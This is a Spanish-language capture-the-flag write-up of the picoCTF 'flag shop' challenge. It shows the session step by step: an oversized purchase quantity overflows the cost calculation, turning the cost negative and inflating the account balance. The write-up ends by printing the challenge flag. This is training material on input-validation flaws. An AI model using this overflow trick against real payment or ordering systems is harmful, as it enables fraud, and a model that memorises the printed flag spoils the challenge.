## Reto: flag shop
### Descripción
Hay una tienda de banderas vendiendo cosas, ¿puedes comprar una bandera? [Fuente](https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c). Conectar con `nc jupiter.challenges.picoctf.org 4906`.
### Solución
Iniciamos descargando el archivo fuente de la tienda de banderas con ayuda del comando **wget**:
```shell
wget https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c
```

Una vez descargado, procedemos a conectarnos al servidor proporcionado por la descripción, donde como se aprecia al establecer conexión nos aparece un menú con opciones a elegir:
```shell
nc jupiter.challenges.picoctf.org 4906
```

Nos aparece lo siguiente:
```q
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

Debido a que desconocemos si poseemos recursos, procedemos a revisar el balance de la cuenta:
```q
 Enter a menu selection
1



 Balance: 1100
```

Una vez que sabemos que contamos con recursos, procedemos a revisar la compra de banderas, iniciando por la primera opción, donde se realiza la compra, pero como decía en el encabezado, al final de cuentas no compramos nada en realidad, solo nos disminuyó el dinero de nuestra cuenta:
```q
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
1

The final cost is: 900

Your current balance after transaction: 200

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

Entonces se procede a verificar la segunda opción de compra, resultando en que 1337 banderas cuestan 100000 dólares, pero al no contar con dicha cantidad, se ingresa un número negativo:
```shell
Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
-1002020202
```

Dicho movimiento no nos resultó como esperábamos, ya que cerró la tienda y volvimos a prompt original:

```shell
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1
```

No es hasta después de muchos intentos, se descubrió por accidente la forma de poder agregar fondos a nuestra cuenta, agregando en total 651691084 dólares:

```shell
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
100000000000000000

The final cost is: -651689984

Your current balance after transaction: 651691084

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
```

Por lo que ahora si disponemos del suficiente dinero para comprar las 1337 banderas, opción que procedemos a ejecutar:

```shell
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one 1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags
```

Como podemos ver la compra fue exitosa, dado que nos arrojó la bandera que necesitamos para resolver este reto:

```
picoCTF{m0n3y_bag5_9c5fac9b}
```

### Notas adicionales
### Referencias

 
